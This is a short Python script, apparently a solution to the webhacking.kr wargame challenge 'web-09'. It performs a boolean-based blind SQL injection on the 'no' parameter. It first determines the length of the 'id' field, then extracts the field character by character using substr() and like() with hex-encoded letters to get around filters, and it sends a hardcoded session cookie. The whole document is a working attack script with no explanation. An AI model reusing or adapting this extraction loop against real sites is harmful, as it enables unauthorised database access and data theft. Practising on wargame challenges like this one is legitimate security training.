from requests import *
from string import *
key='3'
cookies={"PHPSESSID":"ipgnc503l45a5gc7jot18l5938"}
leng=0
count=0
for i in range(20):
        url=f'https://webhacking.kr/challenge/web-09/?no=if(length(id)like({i}),3,99)'
        response=get(url=url,cookies=cookies)
        t=response.text
        if t.find(key) != -1:
                print('no\'3 length: ',i)
                leng=i
                break
print('no\'3 : ',end='')
for i in range(1,leng+1):
        if count>113:
                print('query error')
                break
        for j in range(97,133):
                k=hex(j).split('0x')[1]
                url=f'https://webhacking.kr/challenge/web-09/?no=if((substr(id,{i},1))like(0x{k}),3,99)'
                response=get(url=url,cookies=cookies)
                t=response.text
                count+=1
                if t.find(key) != -1:
                        print(chr(j),end='')
                        count=0
                        break
print('\n')               